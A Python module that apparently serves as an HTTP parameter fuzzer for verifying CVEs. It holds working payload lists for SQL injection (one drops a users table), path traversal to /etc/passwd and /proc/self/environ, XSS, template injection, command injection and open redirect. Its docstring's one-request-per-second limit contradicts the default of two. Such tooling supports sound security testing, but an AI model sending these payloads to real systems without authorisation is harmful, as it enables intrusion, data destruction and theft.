"""autofuzz.py — HTTP parameter fuzzer for CVE verification.

When an endpoint is confirmed accessible but the vulnerable parameter is
unknown, this module iterates a targeted parameter wordlist with injection
payloads and compares responses to identify the injection point.

Design principles:
- Not a dumb scanner: it uses CVE class to pick the RIGHT payloads
  (SQL payloads for sqli, path payloads for LFI, XSS for reflected XSS)
- Canary-based: each payload includes a unique canary so we know WHICH
  request triggered the anomaly, not just that SOMETHING did
- Error-sensitive: tracks response status changes, body length changes,
  and canary reflection, not just error keywords
- Budget-aware: stops when time budget is consumed
- Never sends more than 1 request/second (rate-limit safety)

Usage:
    from .autofuzz import fuzz_parameters, FuzzResult
    hits = fuzz_parameters(
        base_url="http://localhost:8080",
        endpoint="/api/users",
        http_method="GET",
        vuln_class="sqli",
        auth_headers={"Authorization": "Bearer token"},
        on_step=step,
        budget_s=60.0,
    )
    # hits: list of FuzzHit with param, payload, evidence
"""
from __future__ import annotations

import hashlib
import os
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional

from .wpverify import _http_request

# ── Parameter wordlists by context ───────────────────────────────────────────

_COMMON_PARAMS = [
    "id", "user_id", "userId", "uid", "account_id", "accountId",
    "name", "username", "user", "email", "q", "query", "search",
    "filter", "sort", "order", "limit", "offset", "page", "per_page",
    "file", "path", "url", "redirect", "next", "return", "ref",
    "token", "key", "secret", "password", "pass", "pwd",
    "action", "type", "category", "tag", "slug",
    "lang", "locale", "format", "output", "callback",
]

_SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "1 OR 1=1",
    "1' AND '1'='1",
    "1 UNION SELECT NULL--",
    "' ; SELECT SLEEP(0)--",  # timing-free, just syntax error
    "\\",  # escape character
    "'\"",  # mixed quotes
    "1; DROP TABLE users--",  # distinctive error trigger
]

_LFI_PAYLOADS = [
    "../../etc/passwd",
    "....//....//etc/passwd",
    "/etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
]

_XSS_PAYLOADS = [
    "<script>alert(CANARY)</script>",
    "<img src=x onerror=alert(CANARY)>",
    "javascript:alert(CANARY)",
    '"><script>alert(CANARY)</script>',
    "';alert(CANARY)//",
    "<svg/onload=alert(CANARY)>",
]

_SSTI_PAYLOADS = [
    "{{7*7}}",        # Jinja2/Twig → 49
    "${7*7}",         # FreeMarker/Thymeleaf
    "#{7*7}",         # EL injection
    "<%= 7*7 %>",     # ERB/ASP
    "{{config}}",     # Flask config leak
]

_CMDI_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; echo CANARY",
    "| echo CANARY",
    "&& echo CANARY",
]

_OPEN_REDIRECT_PAYLOADS = [
    "https://evil.binoracle.test",
    "//evil.binoracle.test",
    "\\\\evil.binoracle.test",
    "/\\evil.binoracle.test",
    "javascript:alert(1)",
]

_PAYLOADS_BY_CLASS: Dict[str, List[str]] = {
    "sqli":                     _SQLI_PAYLOADS,
    "sql-injection":            _SQLI_PAYLOADS,
    "lfi":                      _LFI_PAYLOADS,
    "path-traversal":           _LFI_PAYLOADS,
    "xss":                      _XSS_PAYLOADS,
    "reflected-xss":            _XSS_PAYLOADS,
    "stored-xss":               _XSS_PAYLOADS,
    "ssti":                     _SSTI_PAYLOADS,
    "template-injection":       _SSTI_PAYLOADS,
    "command-injection":        _CMDI_PAYLOADS,
    "rce":                      _CMDI_PAYLOADS,
    "open-redirect":            _OPEN_REDIRECT_PAYLOADS,
}

# ── Result types ──────────────────────────────────────────────────────────────

@dataclass
class FuzzHit:
    param: str
    payload: str
    status: int
    baseline_status: int
    body_snippet: str
    signal: str           # "reflection" | "error_keyword" | "status_change" | "length_anomaly"
    confidence: float     # 0–1
    canary: str = ""

@dataclass
class FuzzResult:
    hits: List[FuzzHit] = field(default_factory=list)
    params_tested: int = 0
    payloads_sent: int = 0
    elapsed_s: float = 0.0
    best_hit: Optional[FuzzHit] = None


# ── Canary helpers ────────────────────────────────────────────────────────────

def _make_canary(param: str, payload_idx: int) -> str:
    """Generate a short unique canary for a param+payload combo."""
    raw = f"{param}-{payload_idx}-{time.time()}"
    return "BNO" + hashlib.md5(raw.encode()).hexdigest()[:8].upper()


def _inject_canary(payload: str, canary: str) -> str:
    return payload.replace("CANARY", canary)


# ── Response baseline ─────────────────────────────────────────────────────────

def _get_baseline(base_url: str, endpoint: str, http_method: str,
                  auth_headers: dict, timeout: int = 10) -> tuple[int, int]:
    """GET the endpoint without any payload. Returns (status, body_len)."""
    try:
        r = _http_request(http_method.upper(),
                          base_url.rstrip("/") + endpoint,
                          headers=auth_headers, timeout=timeout)
        return r.status, len(r.body or "")
    except Exception:
        return 0, 0


# ── Signal detection ──────────────────────────────────────────────────────────

_ERROR_KEYWORDS = [
    # SQL errors
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "pg::syntaxerror",
    "ora-00907",
    "sqlite3::exception",
    "sqlstate",
    "mysql_fetch",
    # LFI
    "root:x:0:0",
    "etc/passwd",
    "[boot loader]",  # Windows boot.ini
    # SSTI
    "jinja2",
    "templateerror",
    # Generic
    "traceback",
    "stacktrace",
    "exception in",
    "unhandled exception",
    "internal server error",
    "syntax error",
    "parse error",
]

_SSRF_KEYWORDS = ["evil.binoracle.test"]


def _detect_signal(payload: str, canary: str, status: int, baseline_status: int,
                   body: str, baseline_len: int) -> tuple[str, float]:
    """Detect which signal (if any) is present. Returns (signal, confidence)."""
    body_lower = body.lower()

    # Canary reflected → XSS/SSTI/injection confirmed
    if canary and canary.lower() in body_lower:
        return "reflection", 0.95

    # Error keywords → injection syntax error
    for kw in _ERROR_KEYWORDS:
        if kw in body_lower:
            return "error_keyword", 0.80

    # Status change: 200→500, 200→403 (may indicate different code path)
    if baseline_status > 0 and status != baseline_status:
        if status == 500 and baseline_status != 500:
            return "status_change", 0.75
        if status == 200 and baseline_status == 403:
            return "status_change", 0.70

    # Body length anomaly (> 30% change)
    if baseline_len > 0:
        ratio = abs(len(body) - baseline_len) / baseline_len
        if ratio > 0.30:
            return "length_anomaly", 0.50

    return "", 0.0


# ── Core fuzzer ───────────────────────────────────────────────────────────────

def fuzz_parameters(
        base_url: str,
        endpoint: str,
        http_method: str = "GET",
        vuln_class: str = "",
        auth_headers: Optional[dict] = None,
        extra_params: Optional[List[str]] = None,
        on_step: Optional[Callable] = None,
        budget_s: float = 60.0,
        min_confidence: float = 0.70,
        requests_per_second: float = 2.0,
) -> FuzzResult:
    """Fuzz endpoint parameters with class-specific payloads.

    Args:
        base_url:              target base URL (e.g. http://localhost:8080)
        endpoint:              path to fuzz (e.g. /api/users)
        http_method:           GET or POST
        vuln_class:            CVE class — picks payload wordlist
        auth_headers:          headers to include in every request
        extra_params:          additional parameter names to try
        on_step:               progress callback
        budget_s:              max total seconds
        min_confidence:        only return hits above this confidence
        requests_per_second:   rate limit (default 2 req/s)

    Returns FuzzResult with hits sorted by confidence descending.
    """
    t0 = time.time()
    step = on_step or (lambda _m: None)
    res = FuzzResult()
    headers = auth_headers or {}

    # Pick payloads for this vuln class
    _class_lower = (vuln_class or "").lower()
    payloads = _PAYLOADS_BY_CLASS.get(_class_lower, [])
    if not payloads:
        # Generic: try a mix of error-triggering payloads
        payloads = _SQLI_PAYLOADS[:3] + _SSTI_PAYLOADS[:2] + _CMDI_PAYLOADS[:2]

    params = list(_COMMON_PARAMS)
    if extra_params:
        for p in extra_params:
            if p not in params:
                params.insert(0, p)

    # Baseline
    baseline_status, baseline_len = _get_baseline(
        base_url, endpoint, http_method, headers)
    if baseline_status == 0:
        step("  autofuzz: no se pudo obtener baseline — endpoint no accesible")
        res.elapsed_s = time.time() - t0
        return res

    step(f"  autofuzz: baseline={baseline_status} len={baseline_len} | "
         f"{len(params)} params × {len(payloads)} payloads "
         f"({len(params)*len(payloads)} combos max, budget={budget_s:.0f}s)")

    _min_interval = 1.0 / max(0.1, requests_per_second)

    for param in params:
        if time.time() - t0 >= budget_s:
            step(f"  autofuzz: presupuesto agotado ({res.payloads_sent} requests enviados)")
            break
        res.params_tested += 1
        for idx, raw_payload in enumerate(payloads):
            if time.time() - t0 >= budget_s:
                break
            canary = _make_canary(param, idx)
            payload = _inject_canary(raw_payload, canary)
            url = base_url.rstrip("/") + endpoint
            body_data = None

            if http_method.upper() == "GET":
                url += f"?{param}={payload}"
            else:
                body_data = f"{param}={payload}"

            try:
                _t_req = time.time()
                r = _http_request(http_method.upper(), url,
                                  data=body_data, headers=headers, timeout=8)
                res.payloads_sent += 1
                _elapsed_req = time.time() - _t_req

                signal, confidence = _detect_signal(
                    payload, canary, r.status, baseline_status,
                    r.body or "", baseline_len)

                # Timing signal for blind SQL/cmd
                if _elapsed_req > 4.5 and not signal:
                    signal, confidence = "timing", 0.75

                if signal and confidence >= min_confidence:
                    hit = FuzzHit(
                        param=param, payload=raw_payload,
                        status=r.status, baseline_status=baseline_status,
                        body_snippet=(r.body or "")[:300],
                        signal=signal, confidence=confidence, canary=canary)
                    res.hits.append(hit)
                    step(f"  autofuzz: HIT param={param!r} signal={signal} "
                         f"conf={confidence:.0%} status={r.status}")
                    if confidence >= 0.90:
                        # High confidence — stop looking
                        break

                # Rate limiting
                _sleep = max(0.0, _min_interval - (time.time() - _t_req))
                if _sleep > 0:
                    time.sleep(_sleep)

            except Exception:
                continue

    # Sort by confidence descending
    res.hits.sort(key=lambda h: h.confidence, reverse=True)
    res.best_hit = res.hits[0] if res.hits else None
    res.elapsed_s = time.time() - t0

    if res.hits:
        step(f"  autofuzz: {len(res.hits)} hits encontrados en "
             f"{res.payloads_sent} requests ({res.elapsed_s:.1f}s) — "
             f"mejor: param={res.best_hit.param!r} signal={res.best_hit.signal}")
    else:
        step(f"  autofuzz: sin hits en {res.payloads_sent} requests ({res.elapsed_s:.1f}s)")

    return res
